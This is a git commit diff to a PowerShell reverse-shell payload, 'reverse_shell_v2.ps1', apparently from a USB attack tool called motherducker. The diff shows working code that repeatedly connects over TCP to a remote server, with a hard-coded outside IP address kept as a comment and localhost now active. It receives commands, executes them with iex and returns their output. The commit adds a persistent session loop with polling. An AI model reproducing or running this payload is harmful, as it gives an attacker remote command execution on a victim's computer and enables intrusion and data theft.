1f43f316f0238be6e70184b2b69a75dfa68b72ce
puijjar <puijjar@gmail.com>
2019-12-12 18:00:49 +0100

    Added polling to wait for server communication.

--- motherducker/payloads/reverse_shell_v2.ps1
+++ motherducker/payloads/reverse_shell_v2.ps1
@@ -6,7 +6,7 @@ try {
 }
 
 # Calculate SHA-256 hash from UUID.
-$hasher = [System.Security.Cryptography.HashAlgorithm]::Create('sha256');
+$hasher = [System.Security.Cryptography.HashAlgorithm]::Create("sha256");
 $uuid = $hasher.ComputeHash($uuid);
 
 # Preallocate byte array with zeroes? Max command length 65535 bytes?
@@ -15,34 +15,39 @@ $uuid = $hasher.ComputeHash($uuid);
 # Loop indefinitely until "exit" command is issued.
 while (1) {
 
-	# Attempt to establish connection to server. Retry in 5 seconds.
+	# Attempt to establish connection to server. Retry every 3 seconds.
 	try {
-		$client = New-Object System.Net.Sockets.TCPClient("145.24.222.156", 5000);
+		#$client = New-Object System.Net.Sockets.TCPClient("145.24.222.156", 5000);
+		$client = New-Object System.Net.Sockets.TCPClient("localhost", 5000);
 	} catch { # Catch ConstructorInvokedThrowException..
-		Start-Sleep -s 5;
+		Start-Sleep -s 3;
 		continue;
 	}
 	# Initialize byte stream.
 	$stream = $client.GetStream();
 
-    # Read bytes from stream and encode to ASCII.
-    $i = $stream.Read($bytes, 0, $bytes.Length);
-    $cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);
+	# Keep session established as long as "exit" command is issued.
+	while (1) {
+		# Read bytes from stream and encode to ASCII.
+		$i = $stream.Read($bytes, 0, $bytes.Length);
+		$cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);
 
-    # If no bytes were read, connection was likely closed.
-	if ($cmd -eq "") {
-        continue;
-    } elseif ($cmd -eq "exit") {
-        break;
-    }
+		# Retry in 2 seconds if there were nothing to read.
+		if ($cmd -eq "") {
+			Start-Sleep -s 2;
+			continue;
+		} elseif ($cmd -eq "exit") {
+			exit 1;
+		}
 
-    # Run command, encode stdout as UTF-8.
-    $out = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));
+		# Run command, encode stdout as UTF-8.
+		$out = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));
 
-    # Write output to stream prepended by UUID.
-	$length = $uuid.Length + $out.Length;
-    $stream.Write($uuid + $out, 0, $length);
-    $stream.Flush();
+		# Write output to stream prepended by UUID.
+		$length = $uuid.Length + $out.Length;
+		$stream.Write($uuid + $out, 0, $length);
+		$stream.Flush();
+	}
 
 	$client.Close();
 }
